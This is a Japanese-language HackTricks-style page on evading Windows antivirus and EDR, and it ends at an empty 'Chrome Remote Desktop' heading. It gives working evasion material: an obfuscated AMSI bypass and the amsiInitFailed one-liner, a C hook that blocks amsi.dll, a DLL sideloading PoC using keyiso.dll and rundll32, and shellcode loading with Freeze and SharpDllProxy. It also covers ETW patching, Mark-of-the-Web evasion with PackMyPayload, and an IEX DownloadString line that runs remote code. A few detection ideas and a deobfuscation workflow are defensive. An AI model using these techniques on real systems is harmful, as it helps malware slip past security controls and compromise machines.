# アンチウイルス (AV) バイパス

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Defender を停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender の動作を停止させるツール。
- [管理者なら Defender を無効化する](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、static detection、dynamic analysis、そしてより高度な EDRs では behavioural analysis といった複数の手法を使っています。

### **Static detection**

Static detection は、既知の悪意ある文字列やバイナリ内のバイト配列をフラグ付けしたり、ファイル自体から情報を抽出することで行われます（例: file description、company name、digital signatures、icon、checksum など）。つまり、既知の公開ツールを使うと簡単に検知されやすくなります。これを回避する方法はいくつかあります。

- **Encryption**

バイナリを暗号化すれば、AV はプログラムを検出できなくなりますが、メモリ上で復号して実行するためのローダーが必要になります。

- **Obfuscation**

単にバイナリやスクリプト内のいくつかの文字列を変更するだけで AV を回避できることがありますが、何を難読化するかによっては手間がかかる場合があります。

- **Custom tooling**

自分でツールを開発すれば既知の悪性シグネチャは存在しませんが、時間と労力がかかります。

> [!TIP]
> Windows Defender の静的検知に対してチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。ファイルを複数のセグメントに分割してそれぞれを Defender にスキャンさせることで、どの文字列やバイトがフラグされたかを正確に教えてくれます。

実戦的な AV 回避についてはこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を強くおすすめします。

### **Dynamic analysis**

Dynamic analysis は、AV がサンドボックス内でバイナリを実行して悪意ある動作（例: ブラウザのパスワードを復号して読む、LSASS の minidump を取得する等）を監視する手法です。こちらはやや厄介ですが、サンドボックスを回避するためにできることがいくつかあります。

- **Sleep before execution** 実装次第では、実行前に長時間 sleep することが AV の動的解析を回避する良い方法になることがあります。AV はユーザーの作業を妨げないためにファイルスキャンの時間を短くしています。長いスリープは解析を妨げる可能性があります。ただし、多くの AV のサンドボックスは実装次第でスリープをスキップしてしまうことがあります。
- **Checking machine's resources** 通常サンドボックスは利用可能なリソースが非常に少ないです（例: < 2GB RAM）。さもなければユーザーのマシンが遅くなってしまいます。ここでは CPU 温度やファン回転数をチェックするなど創意工夫が可能で、サンドボックスに実装されていないチェックを利用できます。
- **Machine-specific checks** ターゲットが "contoso.local" ドメインに参加しているワークステーションであれば、コンピュータのドメインをチェックして一致しなければプログラムを終了させる、といったことができます。

実際、Microsoft Defender の Sandbox の computername は HAL9TH なので、マルウェア実行前にコンピュータ名をチェックして HAL9TH だったら Defender のサンドボックス内にいると判断してプロセスを終了させる、といった対応が可能です。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策に関して、[@mgeeky](https://twitter.com/mariuszbit) からのとても良いヒントがいくつかあります。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

前述の通り、**公開ツール**は最終的に**検知される**ので、自問してください：

例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？それともあまり知られていない別のプロジェクトで同じことができないか？

正しい答えは後者である可能性が高いです。mimikatz はおそらく AV や EDR に最も検知されやすいツールの一つで、プロジェクト自体は素晴らしいですが、AV を回避するために扱うのは非常に厄介です。達成したい目的に対して代替手段を探しましょう。

> [!TIP]
> evasion のためにペイロードを修正する場合は、Defender の自動サンプル送信（automatic sample submission）をオフにすることを必ず行ってください。そして、本気で言いますが、長期的な evasion が目的なら **絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV に対する検出状況を確認したい場合は、VM に対象の AV をインストールして、自動サンプル送信をオフにしてからそこでテストし、満足するまで調整してください。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLL を優先して使う** べきです。私の経験では、DLL ファイルは通常 **はるかに検知されにくい** ことが多く、もしペイロードを DLL として実行できる方法があれば非常に単純な回避策になります。

この画像が示すように、Havoc の DLL ペイロードは antiscan.me で 4/26 の検出率だった一方、EXE ペイロードは 7/26 の検出率でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me における通常の Havoc EXE ペイロード vs 通常の Havoc DLL の比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、ローダーの DLL 検索順を利用し、被害者アプリケーションと悪意のあるペイロードを同じ場所に配置することで成立します。

[Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って、DLL Sideloading の影響を受けやすいプログラムを確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムと、それらが読み込もうとする DLL files の一覧を出力します。

私は特に **explore DLL Hijackable/Sideloadable programs yourself** を自分で調べることを強くお勧めします。この手法は適切に行えばかなりステルスですが、公開されている DLL Sideloadable programs を使用すると簡単に見つかる可能性があります。

単にプログラムが読み込むことを期待する名前の悪意のある DLL を配置しただけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数を期待するためです。この問題を解決するために、別の手法である **DLL Proxying/Forwarding** を使用します。

**DLL Proxying** は、プログラムが行う呼び出しをプロキシ（および悪意ある）DLL から元の DLL に転送し、プログラムの機能を維持しつつ payload の実行を処理できるようにします。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを [@flangvik](https://twitter.com/Flangvik/) から使用します。

以下が私が行った手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは2つのファイルを生成します：DLLのソースコードテンプレートとリネームされた元のDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
結果は以下の通りです：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! これは成功と言ってよいでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 本件についてより深く理解するため、[S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)（DLL Sideloading に関する）や [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) をぜひご覧ください。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules は、実際には "forwarders" である関数をエクスポートすることがあります：コードを指す代わりに、エクスポートエントリには `TargetDll.TargetFunc` の形式の ASCII 文字列が含まれます。呼び出し側がそのエクスポートを解決すると、Windows loader は次を行います：

- `TargetDll` をまだロードしていない場合はロードする
- そこから `TargetFunc` を解決する

理解すべき主要な挙動：
- `TargetDll` が KnownDLL の場合、それは保護された KnownDLLs namespace（例: ntdll, kernelbase, ole32）から供給される。
- `TargetDll` が KnownDLL でない場合、通常の DLL 検索順が使用され、その中には forward 解決を行っているモジュールのディレクトリが含まれる。

これは間接的な sideloading プリミティブを可能にします：signed DLL が non-KnownDLL モジュール名へフォワードされた関数をエクスポートしているものを見つけ、次にその signed DLL を、フォワード先のモジュール名とまったく同じ名前の attacker-controlled DLL と同じディレクトリに配置します。フォワードされたエクスポートが呼び出されると、loader はフォワードを解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC（コピーペースト）:
1) 署名済みのシステムDLLを書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` をドロップします。最小限の DllMain だけでコード実行が可能です; DllMain をトリガーするために forwarded function を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済み LOLBin でフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` を解決する際、ローダはフォワード先の `NCRYPTPROV.SetAuditingInterface` を辿る
- その後ローダは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` が既に実行された後にのみ "missing API" エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL でない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧されている。
- You can enumerate forwarded exports with tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 の forwarder inventory を参照して候補を探す: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って shellcode を密かにロードして実行できます.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはただのイタチごっこです。今日有効なものが明日検出される可能性があるため、単一のツールだけに頼らないでください。可能であれば複数の回避手法を連結して使うことを試してください。

## AMSI (Anti-Malware Scan Interface)

AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られました。初期の頃、AVはディスク上の**ファイル**のみをスキャンできたため、もしペイロードを**直接メモリ上で実行**できれば、AVは十分な可視性を持たないため防げませんでした。

AMSI機能はWindowsの以下のコンポーネントに統合されています。

- User Account Control, or UAC (EXE、COM、MSI、または ActiveX のインストール時の昇格)
- PowerShell (スクリプト、対話的使用、および動的コード評価)
- Windows Script Host (wscript.exe と cscript.exe)
- JavaScript and VBScript
- Office VBA macros

これにより、アンチウイルス製品はスクリプトの内容を暗号化や難読化されていない形で取得し、スクリプトの振る舞いを検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで次のアラートが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

先頭に `amsi:` が付加され、その後にスクリプトが実行された実行ファイルのパス（この場合は powershell.exe）が続いている点に注目してください。

ファイルをディスクに置いていなくても、AMSIのためにメモリ内で検出されました。

さらに、**.NET 4.8**以降ではC#コードもAMSIを通されます。これは `Assembly.Load(byte[])` によるインメモリ実行にも影響します。したがって、AMSIを回避したい場合はインメモリ実行において .NET の低いバージョン（例: 4.7.2 以下）を使うことが推奨されます。

AMSIを回避する方法はいくつかあります:

- **Obfuscation**

AMSIは主に静的検出で動作するため、読み込もうとするスクリプトを修正することは検出回避の有効な手段になり得ます。

ただし、AMSIは複数層の難読化が施されていてもスクリプトを元に戻す能力を持っているため、難読化はやり方によっては有効でない場合があります。そのため回避は必ずしも単純ではありません。とはいえ、変数名をいくつか変えるだけで回避できることもあるので、どれだけフラグ付けされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（および cscript.exe、wscript.exe 等）のプロセスにロードすることで実装されているため、特権のないユーザーでもこれを容易に改ざんすることが可能です。AMSIの実装上のこの欠陥により、研究者たちはAMSIスキャンを回避する複数の方法を見つけています。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と、当該プロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはこれの広範な利用を防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするのに必要だったのは、powershell のコード一行だけだった。もちろんこの行は AMSI 自体によってフラグが立てられるため、この手法を使うにはいくつか修正が必要になる。

こちらは私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った修正済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
この投稿が公開されるとおそらくフラグが立つ可能性があることを念頭に置いてください。検出を避けたい場合はコードを公開しないでください。

**Memory Patching**

この手法は最初に[@RastaMouse](https://twitter.com/_RastaMouse/)によって発見され、amsi.dll 内の "AmsiScanBuffer" 関数（ユーザー提供の入力をスキャンする役割） のアドレスを特定し、それを E_INVALIDARG を返す命令で上書きすることを含みます。こうすることで実際のスキャンは 0 を返し、クリーンと解釈されます。

> [!TIP]
> 詳細な説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell でバイパスする他の手法も多数存在します。詳細は [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を参照してください。

### amsi.dll の読み込みを阻止して AMSI をブロックする (LdrLoadDll hook)

AMSI は現在のプロセスに `amsi.dll` がロードされた後にのみ初期化されます。言語非依存で堅牢なバイパスとして、要求されたモジュールが `amsi.dll` の場合にエラーを返すように `ntdll!LdrLoadDll` にユーザーモードのフックを置く方法があります。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。

実装の概要（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- PowerShell、WScript/CScript、およびカスタムローダーなど、AMSI をロードするものすべてで動作します。
- スクリプトを stdin 経由で渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて使用することで、長いコマンドラインの痕跡を避けられます。
- LOLBins 経由で実行されるローダー（例：`regsvr32` が `DllRegisterServer` を呼び出す）で使用されているのが確認されています。

このツール [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) も AMSI を回避するスクリプトを生成します。

**検出された署名を削除する**

現在のプロセスのメモリから検出された AMSI 署名を削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは現在のプロセスのメモリをスキャンして AMSI 署名を探し、NOP 命令で上書きすることでメモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で見つけることができます。

**PowerShell バージョン 2 を使用する**

PowerShell バージョン 2 を使用すると AMSI はロードされないため、スクリプトを AMSI にスキャンされることなく実行できます。次のように実行できます:
```bash
powershell.exe -version 2
```
## PS ロギング

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに有用ですが、検出を回避しようとする攻撃者にとっては問題になることがあります。

PowerShell logging を回避するには、次の手法を使えます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI は読み込まれないため、AMSI によるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御を回避した powershell を起動します（これは Cobal Strike の `powerpick` が使う方法です）。


## 難読化

> [!TIP]
> いくつかの難読化手法はデータを暗号化することに依存しており、それによりバイナリのエントロピーが上がり、AVs や EDRs による検出が容易になります。これには注意し、暗号化は機密情報や隠蔽が必要なコードの特定セクションのみに適用することを検討してください。

### ConfuserExで保護された .NET バイナリの難読化解除

ConfuserEx 2（または商用フォーク）を使うマルウェアを解析する際、ディコンパイラやサンドボックスを妨げる複数の保護レイヤーに遭遇することがよくあります。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼ元の IL を確実に復元します。

1.  Anti-tampering の除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の static constructor (`<Module>.cctor`) 内で復号します。これにより PE checksum もパッチされ、改変があるとバイナリはクラッシュします。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを見つけ、XOR キーを復元し、クリーンなアセンブリを書き直します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれ、独自のアンパッカを作る際に有用です。

2.  シンボル / 制御フローの回復 – *clean* ファイルを **de4dot-cex**（ConfuserEx に対応した de4dot のフォーク）に入力します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespace、class、変数名を復元し、定数文字列を復号します。

3.  Proxy-call の除去 – ConfuserEx はデコンパイルをさらに困難にするため、直接のメソッド呼び出しを軽量なラッパー（いわゆる *proxy calls*）に置き換えます。**ProxyCall-Remover** でこれらを除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップ後は、不透明なラッパー関数（`Class8.smethod_10` など）の代わりに、`Convert.FromBase64String` や `AES.Create()` といった通常の .NET API が見られるようになるはずです。

4.  手動でのクリーンアップ – 生成されたバイナリを dnSpy で開き、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはこれを `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。

上記のチェーンは、悪意あるサンプルを実行せずに実行フローを復元します — オフラインの解析環境で作業する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動トリアージするための IOC として利用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、code obfuscation と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、外部ツールを使わず、コンパイラを変更することなく、`C++11/14` 言語を用いてコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming フレームワークによって生成される一層の難読化された操作を追加し、アプリケーションを解析しようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含む様々な PE files を難読化できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行ファイル向けのシンプルな metamorphic code エンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する LLVM-supported languages 向けの細粒度な code obfuscation フレームワークです。ROPfuscator は通常の命令を ROP chains に変換することで、アセンブリコードレベルでプログラムを難読化し、通常の制御フローの直感を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます。

## SmartScreen & MoTW

インターネットからいくつかの実行ファイルをダウンロードして実行したときに、以下の画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、エンドユーザーが潜在的に悪意のあるアプリケーションを実行するのを防ぐためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen を引き起こし、エンドユーザーに警告してファイルの実行を防ぎます（ただしファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元の URL が記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> 実行ファイルが **trusted** な署名証明書で署名されている場合、**SmartScreen はトリガーされない** ことに注意してください。

ペイロードが Mark of The Web を付与されるのを防ぐ非常に効果的な方法は、ISO のようなコンテナにパッケージングすることです。これは、Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、ペイロードを出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)は、アプリケーションやシステムコンポーネントが**イベントをログ**するための強力なWindowsのロギング機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSIを無効化（バイパス）するのと同様に、ユーザ空間プロセスの**`EtwEventWrite`**関数をイベントをログせずに即座に戻すようにすることも可能です。これは関数をメモリ上でパッチして即時に戻るようにすることで、そのプロセスのETWロギングを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C#バイナリをメモリにロードして実行する手法は以前から知られており、AVに検出されずにpost-exploitationツールを実行する非常に有効な方法です。

ペイロードがディスクに書き込まれず直接メモリにロードされるため、プロセス全体でAMSIをパッチすることだけを気にすればよい、ということになります。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は既にC#アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかの違いがあります:

- **Fork\&Run**

これは**新しい使い捨てプロセスを生成**し、その新プロセスにpost-exploitationの悪意あるコードをインジェクトして実行し、終了後にそのプロセスを終了させる手法です。利点と欠点の両方があります。Fork and run の利点は実行が**Beacon implantプロセスの外部**で行われることです。つまり、post-exploitationの処理で何か問題が起きたり検知されても、我々の**implantが生き残る可能性が高く**なります。欠点は、**Behavioural Detections** に検知される可能性が高くなる点です。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これはpost-exploitationの悪意あるコードを**自身のプロセスにインジェクト**する方法です。これにより新しいプロセスを作成してAVにスキャンされるリスクを回避できますが、ペイロード実行中に何か問題が発生するとプロセスがクラッシュし、ビーコンを**失う可能性が高く**なるという欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assemblyのロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とその InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）を参照してください。

PowerShellからC#アセンブリをロードすることも可能です。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、侵害されたマシンに攻撃者管理のSMB共有上にあるインタプリタ環境へのアクセスを与えることで、他の言語を使って悪意あるコードを実行することが可能です。

SMB共有上のInterpreter Binariesや環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による任意コードを**実行する**ことができます。

リポジトリでは次のように述べられています: Defenderはスクリプトをスキャンし続けますが、Go、Java、PHPなどを活用することで**静的シグネチャを回避する柔軟性が増す**ということです。これらの言語でランダムな非難号化のリバースシェルスクリプトをテストしたところ成功した例が報告されています。

## TokenStomping

Token stompingは、攻撃者が**アクセス トークンやEDRやAVのようなセキュリティ製品を操作**し、権限を低下させることでプロセスが終了しないまま悪意の検査を実行する権限を持たせないようにする手法です。

これを防ぐために、Windowsはセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得するのを**防ぐ**ようにすることが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

